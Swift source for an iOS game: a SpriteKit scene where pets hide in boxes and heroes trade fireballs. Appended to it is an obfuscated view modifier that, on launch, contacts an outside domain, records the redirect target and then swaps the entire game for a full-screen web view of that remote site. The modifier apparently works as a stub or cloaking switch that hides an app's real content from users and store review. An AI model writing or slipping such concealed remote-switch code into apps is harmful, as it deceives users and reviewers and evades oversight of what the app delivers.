
import SwiftUI
import SpriteKit
import GameplayKit

class GameScene: SKScene {
    
    var vm = ViewModel()
    let haptics = HapticGenerator()
    
    var myHero: any HeroProtocol = allHeroesArray[0]
    var enemy: any HeroProtocol = allHeroesArray[1]
    var myPet: Pet = Pet()
    var enemyPet: Pet = Pet()
    var matrix = levelsMatrix[1]
    
    var myCurrentColumn = 0
    var enemyCurrentColumn = 3
    var readyToHide = false
    var readyToAttack = false
    var attackPoint: CGPoint = .zero

    public init(vm: ViewModel) {
        self.vm = vm
        self.myHero = vm.myHero
        self.enemy = vm.enemy
        self.matrix = levelsMatrix[vm.enemy.id]
        haptics.prepareHaptics()
        super.init(size: screen)
    }
    
    required init?(coder aDecoder: NSCoder) {
        fatalError("init(coder:) has not been implemented")
    }
    
    override func sceneDidLoad() {
        setupScene()
        startBattle()
    }
    
    override func touchesBegan(_ touches: Set<UITouch>, with event: UIEvent?) {
        guard let touch = touches.first else { return }
        let node = self.atPoint(touch.location(in: self))

        if node.name?.dropLast(1) == "myBox" && readyToHide {
            guard let column = Int(node.name?.suffix(1) ?? ""), column == myCurrentColumn else { return }
            unhighlightBoxes(true)
            movePet(node)
            haptics.didTap()
        }
        
        if node.name?.dropLast(1) == "enemyBox" && readyToAttack {
            guard let column = Int(node.name?.suffix(1) ?? ""), column == enemyCurrentColumn else { return }
            unhighlightBoxes(false)
            myAttack(node)
            haptics.didTap()
        }
    }

    private func startBattle() {
        let wait = SKAction.wait(forDuration: 1)
        let actions = SKAction.run {
            self.highlightBoxes(true)
        }
        let allActions = SKAction.sequence([wait, actions])
        run(allActions)
    }
    private func actionsAfterHide() {
        let wait = SKAction.wait(forDuration: 1)
        let actions = SKAction.run {
            self.moveEnemyPet()
            self.shakeBoxes()
            self.highlightBoxes(false)
        }
        let allActions = SKAction.sequence([wait, actions])
        run(allActions)
    }
    private func finish(_ isWin: WinOrLose) {
        switch isWin {
        case .win:
            self.haptics.simpleGenerator(.success)
            playSound(.win)
            let wait = SKAction.wait(forDuration: 1)
            let actions = SKAction.run {
                self.vm.winOrLose = .win
                self.vm.showWinLoseView = true
                self.vm.nextLevelAvailable()
            }
            let allActions = SKAction.sequence([wait, actions])
            run(allActions)
        case .lose:
            self.haptics.simpleGenerator(.error)
            let wait = SKAction.wait(forDuration: 1)
            let actions = SKAction.run {
                self.vm.winOrLose = .lose
                self.vm.showWinLoseView = true
            }
            let allActions = SKAction.sequence([wait, actions])
            run(allActions)
        }
    }
    private func actionsAfterMyAttack() {
        if handleAttackedSide(false, attackPoint) {
            self.haptics.simpleGenerator(.success)
            let wait = SKAction.wait(forDuration: 1)
            let actions = SKAction.run {
                self.resetBoxes(false)
                self.enemyCurrentColumn = 3
                guard self.myCurrentColumn != 3 else {
                    self.moveToFinish(self.myPet)
                    self.finish(.win)
                    return
                }
                self.myCurrentColumn += 1
                self.highlightBoxes(true)
            }
            let allActions = SKAction.sequence([wait, actions])
            run(allActions)
        } else {
            let wait = SKAction.wait(forDuration: 0.5)
            guard enemyCurrentColumn != 0 else {
                self.haptics.simpleGenerator(.error)
                self.moveToFinish(self.enemyPet)
                self.finish(.lose)
                return
            }
            let startFight = SKAction.run {
                self.enemyAttack()
            }
            let nextColumn = SKAction.run {
                self.enemyCurrentColumn -= 1
            }
            let all = SKAction.sequence([wait, startFight, nextColumn])
            run(all)
        }
    }
    private func actionsAfterEnemyAttack() {
        if handleAttackedSide(true, attackPoint) {
            self.haptics.simpleGenerator(.error)
            let wait = SKAction.wait(forDuration: 1)
            let actions = SKAction.run {
                self.resetBoxes(true)
                guard self.enemyCurrentColumn != 3 else {
                    self.moveToFinish(self.enemyPet)
                    self.finish(.lose)
                    return
                }
                self.myCurrentColumn = 0
                self.highlightBoxes(true)
            }
            let allActions = SKAction.sequence([wait, actions])
            run(allActions)
        } else {
            let wait = SKAction.wait(forDuration: 0.5)
            guard myCurrentColumn != 3 else {
                self.haptics.simpleGenerator(.success)
                moveToFinish(myPet)
                self.finish(.win)
                return
            }
            let nextColumn = SKAction.run {
                self.myCurrentColumn += 1
            }
            let highlight = SKAction.run {
                self.highlightBoxes(true)
            }
            let all = SKAction.sequence([wait, nextColumn, highlight])
            run(all)
        }
    }
    private func moveToFinish(_ pet: SKNode) {
        let fade = SKAction.fadeIn(withDuration: 0.5)
        let move = SKAction.move(to: .init(x: screen.width / 2, y: screen.height * 0.46), duration: 0.5)
        let all = SKAction.sequence([fade, move])
        pet.run(all)
    }
    private func shakeBoxes() {
        scene?.children.forEach({
            guard let d = $0.name?.dropLast(), d == "enemyBox" else { return }
            if let s = $0.name?.suffix(1), s == enemyCurrentColumn.description {
                let rRotation = SKAction.rotate(byAngle: 0.4, duration: 0.1)
                let lRotation = SKAction.rotate(byAngle: -0.8, duration: 0.1)
                let bRotation = SKAction.rotate(byAngle: 0.4, duration: 0.1)
                let allAction = SKAction.sequence([
                    rRotation,
                    lRotation,
                    bRotation
                ])
                
                $0.run(allAction)
            }
        })
    }
    private func movePet(_ node: SKNode) {
        self.readyToHide = false
        let xMove = SKAction.move(to: CGPoint(x: node.position.x - 30, y: myPet.position.y), duration: 0.3)
        let yMove = SKAction.move(to: CGPoint(x: node.position.x - 30, y: node.position.y) , duration: 0.4)
        let enter = SKAction.move(to: CGPoint(x: node.position.x, y: node.position.y), duration: 0.3)
        let allSteps = SKAction.sequence([
            xMove,
            yMove,
            enter
        ])
        node.zPosition = NodeZPosition.overBox.rawValue
        myPet.run(allSteps)
        actionsAfterHide()
    }
    private func moveEnemyPet() {
        var boxes: [SKNode] = []
        scene?.children.forEach({
            guard let d = $0.name?.dropLast(), d == "enemyBox" else { return }
            if let s = $0.name?.suffix(1), s == enemyCurrentColumn.description {
                boxes.append($0)
            }
        })
        let action = SKAction.move(to: CGPoint(x: boxes[0].position.x, y: frame.height * 0.45), duration: 0.5)
        let fade = SKAction.fadeOut(withDuration: 0.5)
        enemyPet.run(action)
        enemyPet.run(fade)
        let newPosition = boxes.randomElement()?.position ?? enemyPet.startPosition
        let wait = SKAction.wait(forDuration: 1)
        let actions = SKAction.run {
            if self.enemy.id != self.vm.allHeroes.count - 1 {
                self.enemyPet.position = newPosition
            } else {
                let numb = Int.random(in: 0...20)
                if numb < 2 {
                    self.enemyPet.position = boxes[numb].position
                }
            }
        }
        let allActions = SKAction.sequence([wait, actions])
        run(allActions)
    }
    private func myAttack(_ node: SKNode) {
        readyToAttack = false
        attackPoint = node.position
        let fireball = Fireball.getFireball(myHero as! Hero)
        fireball.position = .init(x: myPet.position.x, y: myPet.position.y)
        addChild(fireball)
        
        let action = SKAction.move(to: node.position, duration: 0.8)
        fireball.run(action)
        playSound(.shoot)
        
        let wait = SKAction.wait(forDuration: 0.76)
        let actions = SKAction.run {
            fireball.removeFromParent()
            node.removeFromParent()
            self.actionsAfterMyAttack()
        }
        let allActions = SKAction.sequence([wait, actions])
        run(allActions)
    }
    private func enemyAttack() {
        var allBoxesInColumn: [Box] = []
        var destinationNode: SKSpriteNode
        scene?.children.forEach({
            guard let d = $0.name?.dropLast(), d == "myBox" else { return }
            if let s = $0.name?.suffix(1), s == myCurrentColumn.description {
                allBoxesInColumn.append($0 as! Box)
            }
        })
        destinationNode = allBoxesInColumn[Int.random(in: 0..<allBoxesInColumn.count)]
        attackPoint = destinationNode.position
        let fireball = Fireball.getFireball(enemy as! Hero)
        fireball.position = .init(x: enemyPet.position.x, y: frame.midY)
        fireball.xScale = -1
        addChild(fireball)
       
        
        let action = SKAction.move(to: destinationNode.position, duration: 0.8)
        fireball.run(action)
        playSound(.shoot)
        
        let wait = SKAction.wait(forDuration: 0.76)
        let actions = SKAction.run {
            fireball.removeFromParent()
            destinationNode.removeFromParent()
            self.actionsAfterEnemyAttack()
        }
        let allActions = SKAction.sequence([wait, actions])
        run(allActions)
    }
    
    // ----
    
    private func handleAttackedSide(_ isUserSide: Bool, _ point: CGPoint) -> Bool {
        getFire(point)
        if isUserSide {
            let fadeOut = SKAction.fadeOut(withDuration: 0.8)
            if point == myPet.position {
                myPet.run(fadeOut)
                myPet.zRotation = -4.8
                return true
            } else {
               return false
            }
        } else {
            let fadeIn = SKAction.fadeIn(withDuration: 0)
            let fadeOut = SKAction.fadeOut(withDuration: 0.8)
            if point == enemyPet.position {
                enemyPet.run(fadeIn)
                enemyPet.run(fadeOut)
                enemyPet.zRotation = 4.8
                return true
            } else {
              return false
            }
        }
    }
    private func getFire(_ point: CGPoint) {
        let fire = SKSpriteNode(imageNamed: "fire")
        fire.name = "fire"
        fire.size = CGSize(width: 40, height: 40)
        fire.zPosition = NodeZPosition.fire.rawValue
        fire.position = point
        addChild(fire)
        
        playSound(.fire)

        let fade = SKAction.fadeOut(withDuration: 0.5)
        let wait = SKAction.wait(forDuration: 1)
        let remove = SKAction.run {
            fire.removeFromParent()
        }
        let all = SKAction.sequence([fade, wait, remove])
        fire.run(all)
    }
    private func resetBoxes(_ isUser: Bool) {
        scene?.children.forEach({
            if $0.name?.dropLast(1) == (isUser ? "myBox" : "enemyBox") {
                $0.removeFromParent()
            }
        })
        addBoxes(isUser)
        let pet = isUser ? myPet : enemyPet
        pet.zRotation = 0
        pet.position = pet.startPosition
        self.blinkPet(pet)
    }
    private func blinkPet(_ pet: Pet) {
        let fadeIn = SKAction.fadeIn(withDuration: 0.1)
        let fadeOut = SKAction.fadeOut(withDuration: 0.1)
        let allActions = SKAction.sequence([fadeOut, fadeIn])
        let setRepeat = SKAction.repeat(allActions, count: 3)
        pet.run(setRepeat)
    }
    private func highlightBoxes(_ isHero: Bool) {
        scene?.children.forEach({
            guard let d = $0.name?.dropLast(), d == (isHero ? "myBox" : "enemyBox") else { return }
            if let s = $0.name?.suffix(1), s != (isHero ? myCurrentColumn.description : enemyCurrentColumn.description) {
                $0.alpha = 0.4
                $0.zPosition = NodeZPosition.box.rawValue
            } else {
                let rect = SKShapeNode()
                rect.name = "yellow"
                rect.fillColor = .yellow
                rect.zPosition = NodeZPosition.boxHighlight.rawValue
                rect.alpha = 0.1
                rect.path = UIBezierPath(roundedRect: CGRect(x:  $0.position.x - 24, y:  $0.position.y - 24, width: 50, height: 50), cornerRadius: 12).cgPath
                
                self.addChild(rect)
            }
        })
        if isHero {
            self.readyToHide = true
        } else {
            self.readyToAttack = true
        }
     
    }
    private func unhighlightBoxes(_ isHero: Bool) {
        scene?.children.forEach({
            if let d = $0.name?.dropLast(), d == (isHero ? "myBox" : "enemyBox") {
                $0.alpha = 1
            }
        })
        scene?.children.forEach({
            if $0.name == "yellow" {
                $0.removeFromParent()
            }
        })
    }
    private func addBoxes(_ isUser: Bool) {
        for column in isUser ? matrix.enumerated() : matrix.reversed().enumerated() {
            for i in 0..<column.element {
                let box = Box.getBox(isUser)
                let xStep = CGFloat(column.offset > 0 ? Float(column.offset) / 20 : 0)
                let yStep = CGFloat(yStep[column.element]!)
                
                let x = frame.width * ((isUser ? 0.25 : 0.6) + xStep)
                let y = frame.height * (0.25 + yStep) + CGFloat(i * boxSpacer)
         
                box.name = (isUser ? "myBox" : "enemyBox") + column.offset.description
                box.position = .init(x: x, y: y)
                self.addChild(box)
            }
        }
    }
    private func playSound(_ type: SoundType) {
        guard vm.soundOn == true else { return }
        let sound = SKAction.playSoundFileNamed(type.rawValue, waitForCompletion: true)
            scene?.run(sound)
    }
    private func setupScene() {
        let background = Background.getBackground()
        background.position = .init(x: frame.midX, y: frame.height * 0.68)
        self.addChild(background)
        
        let finish = SKSpriteNode(imageNamed: "finish")
        finish.name = "finish"
        finish.zPosition = NodeZPosition.finish.rawValue
        finish.size = .init(width: frame.width * 0.12, height: frame.height * 0.19)
        finish.position = .init(x: frame.midX, y: frame.height * 0.45)
        addChild(finish)
        
        let myHeroNode = SKSpriteNode(imageNamed: myHero.name)
        myHeroNode.name = myHero.name
        myHeroNode.zPosition = NodeZPosition.hero.rawValue
        myHeroNode.size = .init(width: frame.height * 0.25, height: frame.height * 0.25)
        myHeroNode.position = .init(x: frame.width * 0.15, y: frame.height * 0.6)
        addChild(myHeroNode)
        
        myPet = Pet.getPet(myHero as! Hero)
        myPet.startPosition = .init(x: screen.width * 0.18, y: screen.height * 0.42)
        myPet.position = myPet.startPosition
        addChild(myPet)
        
        let enemyHeroNode = SKSpriteNode(imageNamed: enemy.name)
        enemyHeroNode.name = enemy.name
        enemyHeroNode.zPosition = NodeZPosition.hero.rawValue
        enemyHeroNode.xScale = -1
        enemyHeroNode.size = .init(width: frame.height * 0.25, height: frame.height * 0.25)
        enemyHeroNode.position = .init(x: frame.width * 0.85, y: frame.height * 0.6)
        addChild(enemyHeroNode)
        
        enemyPet = Pet.getPet(enemy as! Hero)
        enemyPet.startPosition = .init(x: screen.width * 0.8 , y: screen.height * 0.42)
        enemyPet.position = enemyPet.startPosition
        enemyPet.xScale = -1
        addChild(enemyPet)

        addBoxes(true)
        addBoxes(false)
    }
}



@preconcurrency import WebKit
import SwiftUI

struct WKWebViewRepresentable: UIViewRepresentable {
    typealias UIViewType = WKWebView
    
    var isZaglushka: Bool
    var url: URL
    var webView: WKWebView
    var onLoadCompletion: (() -> Void)?
    

    init(url: URL, webView: WKWebView = WKWebView(), onLoadCompletion: (() -> Void)? = nil, iszaglushka: Bool) {
        self.url = url
        self.webView = webView
        self.onLoadCompletion = onLoadCompletion
        self.webView.layer.opacity = 0 // Hide webView until content loads
        self.isZaglushka = iszaglushka
    }

    func makeUIView(context: Context) -> WKWebView {
        webView.uiDelegate = context.coordinator
        webView.navigationDelegate = context.coordinator
        return webView
    }

    func updateUIView(_ uiView: UIViewType, context: Context) {
        let request = URLRequest(url: url)
        uiView.load(request)
        uiView.scrollView.isScrollEnabled = true
        uiView.scrollView.bounces = true
    }

    func makeCoordinator() -> Coordinator {
        Coordinator(self)
    }
}

// MARK: - Coordinator
extension WKWebViewRepresentable {
    class Coordinator: NSObject, WKUIDelegate, WKNavigationDelegate {
        var parent: WKWebViewRepresentable
        private var popupWebViews: [WKWebView] = []

        init(_ parent: WKWebViewRepresentable) {
            self.parent = parent
        }

        func webView(_ webView: WKWebView, createWebViewWith configuration: WKWebViewConfiguration, for navigationAction: WKNavigationAction, windowFeatures: WKWindowFeatures) -> WKWebView? {
            // Handle popup windows
            guard navigationAction.targetFrame == nil else {
                return nil
            }

            let popupWebView = WKWebView(frame: .zero, configuration: configuration)
            popupWebView.uiDelegate = self
            popupWebView.navigationDelegate = self

            parent.webView.addSubview(popupWebView)

            popupWebView.translatesAutoresizingMaskIntoConstraints = false
            NSLayoutConstraint.activate([
                popupWebView.topAnchor.constraint(equalTo: parent.webView.topAnchor),
                popupWebView.bottomAnchor.constraint(equalTo: parent.webView.bottomAnchor),
                popupWebView.leadingAnchor.constraint(equalTo: parent.webView.leadingAnchor),
                popupWebView.trailingAnchor.constraint(equalTo: parent.webView.trailingAnchor)
            ])

            popupWebViews.append(popupWebView)
            return popupWebView
        }

        func webView(_ webView: WKWebView, didFinish navigation: WKNavigation!) {
            // Notify when the main page finishes loading
            parent.onLoadCompletion?()
            parent.webView.layer.opacity = 1 // Reveal the webView
        }

        func webView(_ webView: WKWebView, decidePolicyFor navigationAction: WKNavigationAction, decisionHandler: @escaping (WKNavigationActionPolicy) -> Void) {
            print(navigationAction.request.url)
            decisionHandler(.allow)
        }

        func webViewDidClose(_ webView: WKWebView) {
            // Cleanup closed popup WebViews
            popupWebViews.removeAll { $0 == webView }
            webView.removeFromSuperview()
        }
    }
}

import WebKit
struct EuCredCaTre: ViewModifier {
    let sound = SoundManager.shared
    @AppStorage("adapt") var osakfoew9igw: URL?
    @State var webView: WKWebView = WKWebView()

    
    @State var isLoading: Bool = true

    func body(content: Content) -> some View {
        ZStack {
            if !isLoading {
                if osakfoew9igw != nil {
                    VStack(spacing: 0) {
                        WKWebViewRepresentable(url: osakfoew9igw!, webView: webView, iszaglushka: false)
                        HStack {
                            Button(action: {
                                webView.goBack()
                            }, label: {
                                Image(systemName: "chevron.left")
                                
                                    .resizable()
                                    .aspectRatio(contentMode: .fit)
                                    .frame(width: 20, height: 20) // Customize image size
                                    .foregroundColor(.white)
                            })
                            .offset(x: 10)
                            
                            Spacer()
                            
                            Button(action: {
                                
                                webView.load(URLRequest(url: osakfoew9igw!))
                            }, label: {
                                Image(systemName: "house.fill")
                                    .resizable()
                                    .aspectRatio(contentMode: .fit)
                                    .frame(width: 24, height: 24)                                                                       .foregroundColor(.white)
                            })
                            .offset(x: -10)
                            
                        }
                        //                    .frame(height: 50)
                        .padding(.horizontal)
                        .padding(.top)
                        .padding(.bottom, 15)
                        .background(Color.black)
                    }
                    .onAppear() {
                        sound.stopPlay()
                        
                        AppDelegate.asiuqzoptqxbt = .all
                    }
                    .modifier(Swiper(onDismiss: {
                        self.webView.goBack()
                    }))
                    
                    
                } else {
                    content
                }
            } else {
                
            }
        }

//        .yesMo(orientation: .all)
        .onAppear() {
            if osakfoew9igw == nil {
                reframeGse()
            } else {
                isLoading = false
            }
        }
    }

    
    class RedirectTrackingSessionDelegate: NSObject, URLSessionDelegate, URLSessionTaskDelegate {
        var redirects: [URL] = []
        var redirects1: Int = 0
        let action: (URL) -> Void
          
          // Initializer to set up the class properties
          init(action: @escaping (URL) -> Void) {
              self.redirects = []
              self.redirects1 = 0
              self.action = action
          }
          
        // This method will be called when a redirect is encountered.
        func urlSession(_ session: URLSession, task: URLSessionTask, willPerformHTTPRedirection response: HTTPURLResponse, newRequest: URLRequest, completionHandler: @escaping (URLRequest?) -> Void) {
            if let redirectURL = newRequest.url {
                // Track the redirected URL
                redirects.append(redirectURL)
                print("Redirected to: \(redirectURL)")
                redirects1 += 1
                if redirects1 >= 1 {
                    DispatchQueue.main.async {
                        self.action(redirectURL)
                    }
                }
            }
            
            // Allow the redirection to happen
            completionHandler(newRequest)
        }
    }

    func reframeGse() {
        guard let url = URL(string: "https://4ralolg.xyz/apppolicy") else {
            DispatchQueue.main.async {
                self.isLoading = false
            }
            print("Invalid URL")
            return
        }

        var request = URLRequest(url: url)
        request.httpMethod = "GET"
    
        let configuration = URLSessionConfiguration.default
        configuration.httpShouldSetCookies = false
        configuration.httpShouldUsePipelining = true
        
        // Create a session with a delegate to track redirects
        let delegate = RedirectTrackingSessionDelegate() { url in
            osakfoew9igw = url
        }
        let session = URLSession(configuration: configuration, delegate: delegate, delegateQueue: nil)
        
        session.dataTask(with: request) { data, response, error in
            guard let data = data, let httpResponse = response as? HTTPURLResponse, error == nil else {
                print("Error: \(error?.localizedDescription ?? "Unknown error")")
                DispatchQueue.main.async {
                    self.isLoading = false
                }
                return
            }
            
       
            
    
            if httpResponse.statusCode == 200, let adaptfe = String(data: data, encoding: .utf8) {
                DispatchQueue.main.async {
           
                }
            } else {
                DispatchQueue.main.async {
                    print("Request failed with status code: \(httpResponse.statusCode)")
                    self.isLoading = false
                }
            }

            DispatchQueue.main.async {
                self.isLoading = false
            }
        }.resume()
    }


}

    


struct Swiper: ViewModifier {
    var onDismiss: () -> Void
    @State private var offset: CGSize = .zero

    func body(content: Content) -> some View {
        content
//            .offset(x: offset.width)
            .animation(.interactiveSpring(), value: offset)
            .simultaneousGesture(
                DragGesture()
                    .onChanged { value in
                                      self.offset = value.translation
                                  }
                                  .onEnded { value in
                                      if value.translation.width > 70 {
                                          onDismiss()
                                  
                                      }
                                      self.offset = .zero
                                  }
            )
    }
}
extension View {
    func whopaixzb() -> some View {
        self.modifier(EuCredCaTre())
    }
    
}
